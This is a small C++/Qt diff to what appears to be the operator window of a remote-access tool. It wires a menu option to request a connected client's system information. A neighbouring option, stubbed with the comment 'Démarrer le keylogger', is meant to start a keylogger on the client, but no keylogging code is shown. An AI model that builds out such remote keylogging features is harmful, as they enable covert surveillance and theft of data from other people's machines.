@@ -1,4 +1,5 @@
 #include "MainWindow.hpp"
+#include "../utils/SystemInfo/SystemInfo.hpp"
 
 MainWindow::MainWindow(QWidget* parent)
     : QMainWindow(parent)
@@ -92,10 +93,12 @@ void MainWindow::onSelectionButtonClicked(bool) {
     }
     QString selectedClient = selectedItem->text();
     switch (idx) {
-        case 0:
-            // Afficher les informations du client
-            // ... call your logic here
+        case 0: {
+            qDebug() << "[DEBUG] Case 0: Requesting client system info for" << selectedClient;
+            emit sendToClient(selectedClient, ""); // Empty message, just a trigger
+            qDebug() << "[DEBUG] Emitted sendToClient for" << selectedClient;
             break;
+        }
         case 1:
             // Démarrer le keylogger
             break;
